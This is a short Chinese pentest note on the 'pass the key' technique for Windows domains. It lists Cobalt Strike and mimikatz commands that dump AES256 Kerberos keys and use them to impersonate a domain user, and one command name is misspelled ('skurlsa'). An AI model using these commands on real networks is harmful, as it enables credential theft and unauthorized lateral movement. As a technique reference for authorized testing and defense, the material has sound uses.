PTK(pass the key)) 利用的ekeys aes256进行的渗透测试，不常用。

当系统安装了KB2871997 补丁(防止PTH) 且 禁用了NTLM认证的时候，那我们抓取到的ntlm的hash也就失去了作用，
但是可以通过PTK的攻击方式获得权限。
CS中跳板机命令
```
systeminfo //查看系统安装了KB2871997补丁
mimikatz sekurlsa::ekeys
mimikatz skurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值
```